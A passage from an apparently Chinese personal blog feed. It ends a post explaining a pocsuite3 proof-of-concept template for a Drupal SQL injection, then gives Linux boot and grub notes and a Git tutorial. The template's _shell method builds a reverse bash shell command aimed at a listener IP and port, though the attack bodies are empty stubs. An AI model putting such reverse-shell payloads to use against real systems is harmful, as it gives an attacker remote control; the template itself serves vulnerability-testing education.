VUL_TYPE,</span><br><span class="line">    get_listener_ip,</span><br><span class="line">    get_listener_port,</span><br><span class="line">)</span><br><span class="line">from pocsuite3.lib.core.interpreter_option import (</span><br><span class="line">    OptString,</span><br><span class="line">    OptDict,</span><br><span class="line">    OptIP,</span><br><span class="line">    OptPort,</span><br><span class="line">    OptBool,</span><br><span class="line">    OptInteger,</span><br><span class="line">    OptFloat,</span><br><span class="line">    OptItems,</span><br><span class="line">)</span><br><span class="line">from pocsuite3.modules.listener import REVERSE_PAYLOAD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以上就是各种导入模块而已 , 有的用了 , 有的灰色的就是没有使用模块中的内容</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoPOC</span>(<span class="title">POCBase</span>):</span></span><br><span class="line"><span class="class">    <span class="title">vulID</span> = &quot;1571&quot;  # <span class="title">ssvid</span> <span class="title">ID</span> 如果是提交漏洞的同时提交 <span class="title">PoC</span>,则写成 0</span></span><br><span class="line"><span class="class">    <span class="title">version</span> = &quot;1&quot;  # 默认为1</span></span><br><span class="line"><span class="class">    <span class="title">author</span> = &quot;<span class="title">seebug</span>&quot;  # <span class="title">PoC</span>作者的大名</span></span><br><span class="line"><span class="class">    <span class="title">vulDate</span> = &quot;2014-10-16&quot;  # 漏洞公开的时间,不知道就写今天</span></span><br><span class="line"><span class="class">    <span class="title">createDate</span> = &quot;2014-10-16&quot;  # 编写 <span class="title">PoC</span> 的日期</span></span><br><span class="line"><span class="class">    <span class="title">updateDate</span> = &quot;2014-10-16&quot;  # <span class="title">PoC</span> 更新的时间,默认和编写时间一样</span></span><br><span class="line"><span class="class">    <span class="title">references</span> = [&quot;<span class="title">https</span>://<span class="title">xxx</span>.<span class="title">xx</span>.<span class="title">com</span>.<span class="title">cn</span>&quot;]  # 漏洞地址来源,0<span class="title">day</span>不用写</span></span><br><span class="line"><span class="class">    <span class="title">name</span> = &quot;<span class="title">XXXX</span> <span class="title">SQL</span>注入漏洞 <span class="title">PoC</span>&quot;  # <span class="title">PoC</span> 名称</span></span><br><span class="line"><span class="class">    <span class="title">appPowerLink</span> = &quot;<span class="title">https</span>://<span class="title">www</span>.<span class="title">drupal</span>.<span class="title">org</span>/&quot;  # 漏洞厂商主页地址</span></span><br><span class="line"><span class="class">    <span class="title">appName</span> = &quot;<span class="title">Drupal</span>&quot;  # 漏洞应用名称</span></span><br><span class="line"><span class="class">    <span class="title">appVersion</span> = &quot;7.<span class="title">x</span>&quot;  # 漏洞影响版本</span></span><br><span class="line"><span class="class">    <span class="title">vulType</span> = <span class="title">VUL_TYPE</span>.<span class="title">UNAUTHORIZED_ACCESS</span>  # 漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line"><span class="class">    <span class="title">category</span> = <span class="title">POC_CATEGORY</span>.<span class="title">EXPLOITS</span>.<span class="title">WEBAPP</span></span></span><br><span class="line"><span class="class">    <span class="title">samples</span> = []  # 测试样列,就是用 <span class="title">PoC</span> 测试成功的网站</span></span><br><span class="line"><span class="class">    <span class="title">install_requires</span> = []  # <span class="title">PoC</span> 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《<span class="title">PoC</span>第三方模块依赖说明》填写</span></span><br><span class="line"><span class="class">    <span class="title">desc</span> = &quot;&quot;&quot;</span></span><br><span class="line"><span class="class">            <span class="title">Drupal</span> 在处理 <span class="title">IN</span> 语句时，展开数组时 <span class="title">key</span> 带入 <span class="title">SQL</span> 语句导致 <span class="title">SQL</span> 注入，</span></span><br><span class="line"><span class="class">            可以添加管理员、造成信息泄露。</span></span><br><span class="line"><span class="class">        &quot;&quot;&quot;  # 漏洞简要描述</span></span><br><span class="line"><span class="class">    <span class="title">pocDesc</span> = &quot;&quot;&quot;</span></span><br><span class="line"><span class="class">            <span class="title">poc</span>的用法描述</span></span><br><span class="line"><span class="class">        &quot;&quot;&quot;  # <span class="title">POC</span>用法描述</span></span><br><span class="line"><span class="class">    # 各种变量的定义 , 关于<span class="title">poc</span>的描述</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> _<span class="title">options</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        &quot;&quot;&quot;如果<span class="title">poc</span>需要登录,这个是登录函数模板&quot;&quot;&quot;</span></span><br><span class="line"><span class="class">        <span class="title">opt</span> = <span class="title">OrderedDict</span>()  # <span class="title">value</span> = <span class="title">self</span>.<span class="title">get_option</span>(&#x27;<span class="title">key</span>&#x27;)</span></span><br><span class="line"><span class="class">        <span class="title">opt</span>[&quot;<span class="title">string</span>&quot;] = <span class="title">OptString</span>(&quot;&quot;, <span class="title">description</span>=&quot;这个<span class="title">poc</span>需要用户登录，请输入登录账号&quot;, <span class="title">require</span>=<span class="title">True</span>)</span></span><br><span class="line"><span class="class">        <span class="title">opt</span>[&quot;<span class="title">integer</span>&quot;] = <span class="title">OptInteger</span>(</span></span><br><span class="line"><span class="class">            &quot;&quot;, <span class="title">description</span>=&quot;这个<span class="title">poc</span>需要用户密码，请输出用户密码&quot;, <span class="title">require</span>=<span class="title">False</span></span></span><br><span class="line"><span class="class">        )</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">opt</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> _<span class="title">verify</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        # 重点是这个验证代码</span></span><br><span class="line"><span class="class">        <span class="title">output</span> = <span class="title">Output</span>(<span class="title">self</span>)</span></span><br><span class="line"><span class="class">        # 验证代码</span></span><br><span class="line"><span class="class">        <span class="title">result</span> =</span> &#123;</span><br><span class="line">            <span class="comment"># 不管是验证模式或者攻击模式，返回结果 result 中的 key 值必须按照下面的规范来写</span></span><br><span class="line">            <span class="comment"># [ PoC结果返回规范 ]( https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md#resultstandard )</span></span><br><span class="line">            <span class="string">&quot;Result&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;DBInfo&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;Username&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Salt&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Uid&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Groupid&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;ShellInfo&quot;</span>: &#123;<span class="string">&quot;URL&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Content&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;FileInfo&quot;</span>: &#123;<span class="string">&quot;Filename&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Content&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;XSSInfo&quot;</span>: &#123;<span class="string">&quot;URL&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Payload&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;AdminInfo&quot;</span>: &#123;<span class="string">&quot;Uid&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Username&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;Database&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;Hostname&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Username&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;DBname&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;VerifyInfo&quot;</span>: &#123;<span class="string">&quot;URL&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Postdata&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Path&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;SiteAttr&quot;</span>: &#123;<span class="string">&quot;Process&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;Stdout&quot;</span>: <span class="string">&quot;result output string&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> result:  <span class="comment"># result是返回结果</span></span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&quot;target is not vulnerable&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        <span class="comment"># 攻击代码</span></span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def _shell(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())</span><br><span class="line">        <span class="comment"># 攻击代码 execute cmd</span></span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def other_fuc():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def other_utils_func():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册 DemoPOC 类</span></span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure><pre><code>可以根据自己想法修改。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 安全知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 安全知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习笔记（八）启动引导</title>
      <link href="/2021/11/04/linux_study_eight/"/>
      <url>/2021/11/04/linux_study_eight/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Linux的启动流程"><a href="#一、Linux的启动流程" class="headerlink" title="一、Linux的启动流程"></a>一、Linux的启动流程</h1><h2 id="1、BIOS自检"><a href="#1、BIOS自检" class="headerlink" title="1、BIOS自检"></a>1、BIOS自检</h2><h2 id="2、启动GRUB-x2F-LILO"><a href="#2、启动GRUB-x2F-LILO" class="headerlink" title="2、启动GRUB&#x2F;LILO"></a>2、启动GRUB&#x2F;LILO</h2><h2 id="3、运行Linux-kernel并检测硬件"><a href="#3、运行Linux-kernel并检测硬件" class="headerlink" title="3、运行Linux kernel并检测硬件"></a>3、运行Linux kernel并检测硬件</h2><h2 id="4、挂载根文件系统"><a href="#4、挂载根文件系统" class="headerlink" title="4、挂载根文件系统"></a>4、挂载根文件系统</h2><h2 id="5、运行Linux系统的第一个进程init（其PID永远为1，是所有其他进程的父进程）"><a href="#5、运行Linux系统的第一个进程init（其PID永远为1，是所有其他进程的父进程）" class="headerlink" title="5、运行Linux系统的第一个进程init（其PID永远为1，是所有其他进程的父进程）"></a>5、运行Linux系统的第一个进程init（其PID永远为1，是所有其他进程的父进程）</h2><h2 id="6、init读取系统引导配置文件-x2F-etc-x2F-inittab中的信息进行初始化"><a href="#6、init读取系统引导配置文件-x2F-etc-x2F-inittab中的信息进行初始化" class="headerlink" title="6、init读取系统引导配置文件 &#x2F;etc&#x2F;inittab中的信息进行初始化"></a>6、init读取系统引导配置文件 &#x2F;etc&#x2F;inittab中的信息进行初始化</h2><h2 id="7、执行系统初始化脚本-x2F-etc-x2F-rc-d-x2F-rc-sysinit，执行系统初始化（包括很多内容）"><a href="#7、执行系统初始化脚本-x2F-etc-x2F-rc-d-x2F-rc-sysinit，执行系统初始化（包括很多内容）" class="headerlink" title="7、执行系统初始化脚本-&#x2F;etc&#x2F;rc.d&#x2F;rc.sysinit，执行系统初始化（包括很多内容）"></a>7、执行系统初始化脚本-&#x2F;etc&#x2F;rc.d&#x2F;rc.sysinit，执行系统初始化（包括很多内容）</h2><h2 id="8、根据指定的运行级别来运行服务器脚本程序，再执行脚本-x2F-etc-x2F-rc-d-x2F-rc-local"><a href="#8、根据指定的运行级别来运行服务器脚本程序，再执行脚本-x2F-etc-x2F-rc-d-x2F-rc-local" class="headerlink" title="8、根据指定的运行级别来运行服务器脚本程序，再执行脚本 &#x2F;etc&#x2F;rc.d&#x2F;rc.local"></a>8、根据指定的运行级别来运行服务器脚本程序，再执行脚本 &#x2F;etc&#x2F;rc.d&#x2F;rc.local</h2><h2 id="9、运行一些其他的特别服务，一般为-x2F-sbin-x2F-mingetty和-x2F-etc-x2F-X11-x2F-prefdm"><a href="#9、运行一些其他的特别服务，一般为-x2F-sbin-x2F-mingetty和-x2F-etc-x2F-X11-x2F-prefdm" class="headerlink" title="9、运行一些其他的特别服务，一般为&#x2F;sbin&#x2F;mingetty和&#x2F;etc&#x2F;X11&#x2F;prefdm"></a>9、运行一些其他的特别服务，一般为&#x2F;sbin&#x2F;mingetty和&#x2F;etc&#x2F;X11&#x2F;prefdm</h2><h2 id="10、Linux控制台（console）提示用户输入用户名、密码进行登录。"><a href="#10、Linux控制台（console）提示用户输入用户名、密码进行登录。" class="headerlink" title="10、Linux控制台（console）提示用户输入用户名、密码进行登录。"></a>10、Linux控制台（console）提示用户输入用户名、密码进行登录。</h2><p>总结：BIOS初始化→检查外围设备→检查启动设备→读取MBR<br><img src="http://120.48.107.243:9090/blog/2023/04/03/db24c4be85ad4921a8c2ffcfd8477209.png" alt="在这里插入图片描述"></p><h1 id="二、在Linux中常用的启动引导工具：grub和lilo"><a href="#二、在Linux中常用的启动引导工具：grub和lilo" class="headerlink" title="二、在Linux中常用的启动引导工具：grub和lilo"></a>二、在Linux中常用的启动引导工具：grub和lilo</h1><p>在LInux和Windows两系统并存时就需要安装GRUB，GRUB被广泛的用于替代lilo，GRUB支持在启动时使用命令行模式，支持md5加密保护，还可以从ext2&#x2F;ext3，ReiseFS、JFS、FAT、Minix以及FFS文件系统上启动其配置文件为&#x2F;boot&#x2F;grub&#x2F;grun.conf，更改grub.conf即可立时生效如果硬盘上的MBR被更动过，可以用&#x2F;sbin&#x2F;grub-install&#x2F;dev&#x2F;hda来重装grub现在打开&#x2F;boot&#x2F;grub&#x2F;grub.conf查看一下：<br>命令： vim &#x2F;boot&#x2F;grub&#x2F;grub.conf</p><p>内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># grub.conf generated by anaconda</span><br><span class="line">#</span><br><span class="line"># Note that you do not have to rerun grub after making changes to this file</span><br><span class="line"># NOTICE: You have a /boot partition. This means that</span><br><span class="line"># all kernel and initrd paths are relative to /boot/, eg.</span><br><span class="line"># root (hd0,0)</span><br><span class="line"># kernel /vmlinuz-version ro root=/dev/sda2</span><br><span class="line"># initrd /initrd-version.img</span><br><span class="line">#boot=/dev/sda</span><br><span class="line">default=0</span><br><span class="line">#default=0 表示默认启动第一个系统,如果系统有两个系统是用什么做为分隔符的呢？title 就是系统的分</span><br><span class="line">隔符,第一个 title 后面就是第一个系统,用 0 表示。</span><br><span class="line">timeout=5</span><br><span class="line">#timout=5，就是默认在启动选择界面停留的时间，单位是秒。等待 5 秒自动进入默认操作系统</span><br><span class="line">splashimage=(hd0,0)/grub/splash.xpm.gz</span><br><span class="line">#splashimage 是 grub 启动背景画面，如果是自己写 grub.conf 文件，这个可以不用写。</span><br><span class="line">hiddenmenu</span><br><span class="line">title Red Hat Enterprise Linux Server (2.6.18-53.el5)</span><br><span class="line">#title 后面就是系统在启动时候显示的名字</span><br><span class="line">root (hd0,0)</span><br><span class="line">#root 启动文件所在位置</span><br><span class="line">kernel /vmlinuz-2.6.18-53.el5 ro root=LABEL=/ rhgb quiet</span><br><span class="line">#kernel 内核所在位置和名字</span><br><span class="line">initrd /initrd-2.6.18-53.el5.img</span><br><span class="line">#initrd 内核镜象的名字</span><br><span class="line">grub.conf 的范例：</span><br><span class="line">timeout=10 #等待 10 秒自动进入默认操作系统</span><br><span class="line">splashimage=(hd0,0)/grub/splash.xpm.gz #grub 启动背景画面</span><br><span class="line">default=0 #默认进入第一个标题</span><br><span class="line">title Red Hat Linux (2.4.20-18) #Red Hat Linux 标题</span><br><span class="line">root (hd0,0) #根文件系统位置</span><br><span class="line">kernel /vmlinuz-2.4.20-18 ro root=LABEL=/ #核心位置与核心加载参数</span><br><span class="line">initrd /initrd-2.4.20-18.img #启动 initrd ram 盘</span><br><span class="line">title windows #另一个操作系统的标题</span><br><span class="line">rootnoverify (hd0,1) #操作系统存放在 hd0,1 上，不要在 grub 里 mount</span><br><span class="line">chainloader +1 #从 hd0,1 的第一个扇面启动</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git的强大之处</title>
      <link href="/2021/11/01/git_study/"/>
      <url>/2021/11/01/git_study/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/25f3c5f2a8f94517a6d49d8ad69a0d8d.png" alt="在这里插入图片描述"><br>本篇文章是关于git的学习记录。</p><h1 id="一、什么是git"><a href="#一、什么是git" class="headerlink" title="一、什么是git"></a>一、什么是git</h1><p>Git（读音为&#x2F;gɪt&#x2F;）是一个开源的<strong>分布式版本控制系统</strong>，可以有效、高速地处理从很小到非常大的项目版本管理。 也是[Linus Torvalds](<a href="https://baike.baidu.com/item/Linus">https://baike.baidu.com/item/Linus</a> Torvalds&#x2F;9336769)为了帮助管理Linux内核开发而开发的一个开放源码的版本控制软件。民间也有流传 , 是<br>Linus Torvalds , 看不惯当时的一些版本控制系统收费的现状 , 自己在小黑屋里写了两周搞出来的产物<br>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持<br>#二、为什么要有git<br>在git出现之前 , 在一些企业中使用到的版本控制软件大都是 svn , 自从git出现以后 , 就取代了svn的位置 , 下面是关于两者的区别<br>Git 不仅仅是个版本控制系统，它也是个内容管理系统(CMS)，工作管理系统等。<br>如果你是一个具有使用 SVN 背景的人，你需要做一定的思想转换，来适应 Git 提供的一些概念和特征。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Git 与 SVN 区别点：</span><br><span class="line"></span><br><span class="line">- **<span class="number">1</span>、Git 是分布式的，SVN 不是**：这是 Git 和其它非分布式的版本控制系统，例如 SVN，CVS 等，最核心的区别。</span><br><span class="line">- **<span class="number">2</span>、Git 把内容按元数据方式存储，而 SVN 是按文件：**所有的资源控制系统都是把文件的元信息隐藏在一个类似 .svn、.cvs 等的文件夹里。</span><br><span class="line">- **<span class="number">3</span>、Git 分支和 SVN 的分支不同：**分支在 SVN 中一点都不特别，其实它就是版本库中的另外一个目录。</span><br><span class="line">- **<span class="number">4</span>、Git 没有一个全局的版本号，而 SVN 有：**目前为止这是跟 SVN 相比 Git 缺少的最大的一个特征。</span><br><span class="line">- **<span class="number">5</span>、Git 的内容完整性要优于 SVN：**Git 的内容存储使用的是 SHA-<span class="number">1</span> 哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。</span><br></pre></td></tr></table></figure><h1 id="三、git的安装"><a href="#三、git的安装" class="headerlink" title="三、git的安装"></a>三、git的安装</h1><p>git的下载地址：<br><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/b15d4062de114980b68b8ed08977e3d5.png" alt="在这里插入图片描述"><br>下载好后，双击打开，下一步，下一步，安装即可，当在任意目录右键有git的方式，即为安装成功。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2afa6b2efb834931bb0e1d1205049493.png" alt="在这里插入图片描述"></p><h1 id="四、基础命令"><a href="#四、基础命令" class="headerlink" title="四、基础命令"></a>四、基础命令</h1><p>官方教程：<br><a href="http://git-scm.com/docs">http://git-scm.com/docs</a><br>##1、注册账号<br>使用git之前 , 需要先初始化一个账号 , 可以使用下面的命令初始化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;Your Name&quot;</span></span><br><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">&quot;email@example.com&quot;</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/2d1fdfb051e9408996d75a9b6f4ad597.png" alt="在这里插入图片描述"></p><h2 id="2、初始化仓库"><a href="#2、初始化仓库" class="headerlink" title="2、初始化仓库"></a>2、初始化仓库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化工作区域</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加文件</span></span><br><span class="line">git add <span class="string">&quot;文件名&quot;</span></span><br><span class="line"><span class="comment"># 添加当前目录下的所有文件</span></span><br><span class="line">git add . </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看工作区域状态</span></span><br><span class="line">git status</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/35df8ed66e5f462cbde6934cd7eca6cb.png" alt="在这里插入图片描述"></p><h2 id="3、github创建远程仓库"><a href="#3、github创建远程仓库" class="headerlink" title="3、github创建远程仓库"></a>3、github创建远程仓库</h2><p>上面的初始化仓库命令 , 只是在本地创建好仓库 , 接下来在使用github创建一个远程仓库 , 当然前提你要有一个github账号 , 这个申请注册非常的简单。<br>登录github账号，点击New repository：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2b4541a5a16542409989dea8f6b35aa1.png" alt="在这里插入图片描述"></p><p>填好相关信息：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5fad3ebcb2094f1d9e830071f39b9b62.png" alt="在这里插入图片描述"><br>然后就创建好了：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b717c55f472a4cc9a68f9b7e67b7e8a4.png" alt="在这里插入图片描述"><br>这里会给一些提示命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;# test&quot;</span> &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git add README.md    <span class="comment"># 添加到暂存区</span></span><br><span class="line">git commit -m <span class="string">&quot;first commit&quot;</span>  <span class="comment"># 提交</span></span><br><span class="line">git branch -M main</span><br><span class="line">git remote add origin https://github.com/1derian/test.git</span><br><span class="line">git push -u origin main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地已经有了一个仓库</span></span><br><span class="line">git remote add origin https://github.com/1derian/test.git</span><br><span class="line">git branch -M main</span><br><span class="line">git push -u origin main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码</span></span><br><span class="line"><span class="comment"># 初始化工作区域</span></span><br><span class="line">git init</span><br><span class="line"><span class="comment"># 添加当前目录下的所有文件</span></span><br><span class="line">git add . </span><br><span class="line">git commit -m <span class="string">&quot;first commit&quot;</span>  </span><br><span class="line">git branch -M main</span><br><span class="line">git remote add origin https://github.com/1derian/thinkphp5-rce.git</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure><h2 id="4、本地仓库推到远程"><a href="#4、本地仓库推到远程" class="headerlink" title="4、本地仓库推到远程"></a>4、本地仓库推到远程</h2><p>这里我们在本地新建了个文件夹，里面放了一个文件：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/194168691e6c4c04912a85a27124137f.png" alt="在这里插入图片描述"><br>输入命令，提交：<br>命令：git push -u orgin main<br>结果：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8f9a52df65b64219b9d7febb32cc93b5.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/63e5cd79e82c431db52d4c10b287a1ad.png" alt="在这里插入图片描述"><br>如果遇到超时错误，可以设置一个代理：<br>git config –global http.proxy ip:port<br>git config –global https.proxy ip:port</p><h2 id="5、再次推送"><a href="#5、再次推送" class="headerlink" title="5、再次推送"></a>5、再次推送</h2><p>当你的项目中又添加了东西，创建了新的文件，那可以这样做：<br>git add .<br>git commit -m “second commit”<br>git push -u origin main<br>##6、补充<br>.gitignore 文件中可以设置忽略提交的文件&#x2F;文件夹 , 该操作一定是在第一次git add . 之前<br>比如我的工作目录下有一个config.txt , 不想推送到远程仓库中 , 你可以这样做<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5878053bc11c4b688baf8032bed8b70f.png" alt="在这里插入图片描述"><br>当然也支持通配符：<br>target          &#x2F;&#x2F;忽略这个target目录<br>angular.json    &#x2F;&#x2F;忽略这个angular.json文件<br>log&#x2F;*           &#x2F;&#x2F;忽略log下的所有文件<br>css&#x2F;*.css       &#x2F;&#x2F;忽略css目录下的.css文件<br>#五、总结<br>这些仅仅是git的九牛一毛 , 但是也够新手操作的了 , 关于git更多的玩法 , 你会在真实的项目中 , 以及解决的报错中慢慢的学习到git的强大</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 工具学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 工具学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习笔记（七）时间管理</title>
      <link href="/2021/10/27/linux_study_seven/"/>
      <url>/2021/10/27/linux_study_seven/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Linux时间介绍"><a href="#一、Linux时间介绍" class="headerlink" title="一、Linux时间介绍"></a>一、Linux时间介绍</h1><pre><code>Linux时钟分为系统时钟（System Clock）和硬件（Real Time Clock，简称RTC）时钟。系统时钟是指当前Linux Kernel中的时钟，而硬件时钟则是主板上由电池供电的时钟，这个硬件时钟可以在BIOS中进行设置，当Linux启动时，硬件时钟会去读取系统时钟的设置，然后系统设置就会独立与硬件运作。Linu中的所有命令（包括函数）都是采用的系统时钟设置，在Linux中，用于时钟查看和设置的命令主要有date、hwclock和clock，其中，clock和hwclock用法接近，只用一个 就行，只不过clock命令除了支持x86硬件体系外，还支持Alpha硬件体系。</code></pre><h1 id="二、Linux时间设置命令"><a href="#二、Linux时间设置命令" class="headerlink" title="二、Linux时间设置命令"></a>二、Linux时间设置命令</h1><h2 id="1、date"><a href="#1、date" class="headerlink" title="1、date"></a>1、date</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法格式：date [-u] [-d datestr] [-s datestr] [--utc] [--universal] [--date=datestr] [--set=datestr] [--help][--version] [+FORMAT] [MMDDhhmm[[CC]YY][.ss]]</span><br></pre></td></tr></table></figure><p><strong>说明：可以用来设置系统日期与实践，只有管理员才有设置日期与时间的权限，一般用户只能用date命令显示时间，若不加任何参数，data会显示目前的日期与时间。</strong><br>例1：显示当前系统时间：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/929076f7863a4f30b8e679dca1fcd34f.png" alt="在这里插入图片描述"><br>例2：设置日期和时间为2022年9月12日12:00<br><img 